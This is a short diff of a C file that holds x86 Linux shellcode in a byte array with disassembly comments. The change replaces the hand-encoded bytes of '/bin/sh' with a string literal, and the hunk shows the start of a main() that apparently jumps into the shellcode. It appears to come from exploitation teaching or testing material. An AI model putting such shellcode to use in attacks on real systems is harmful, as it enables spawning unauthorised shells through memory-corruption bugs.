@@ -36,10 +36,7 @@ char shellcode[] = 	"\xeb\x15"			// jmp    8048077 <_start+0x17>
 	"\xfe\xc0"							// inc    %al
 	"\xcd\x80"							// int    $0x80
 	"\xe8\xe6\xff\xff\xff"				// call   8048062 <_start+0x2>
-	"\x2f"								// das    
-	"\x62\x69\x6e"						// bound  %ebp,0x6e(%ecx)
-	"\x2f"								// das    
-	"\x73\x68";							// jae    80480eb <_start+0x8b>
+	"/bin/sh";
 
 int main(int argc, char **argv) {
 	int *ret; 
